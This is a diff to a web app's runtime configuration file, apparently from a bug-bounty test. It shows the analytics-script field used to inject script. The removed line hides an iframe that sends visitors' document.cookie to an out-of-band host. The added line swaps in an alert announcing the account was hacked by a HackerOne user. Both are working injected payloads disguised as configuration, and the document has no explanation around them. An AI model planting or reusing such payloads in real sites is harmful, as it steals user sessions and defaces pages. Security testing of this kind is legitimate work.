@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>\nwindow._=document.createElement`iframe`;\nwindow._.src=`https://dnlajyopkvalkrtcbatedyoiypr5wdpqg.oast.fun?data=${document.cookie}`;\nwindow._.style.display='none';\ndocument.body.appendChild(window._);\n</script><iframe src=x",
+  "VITE_ANALYTICS_SCRIPT": "<script>\nalert`Account Hacked By lavado At HackerOne`\n</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
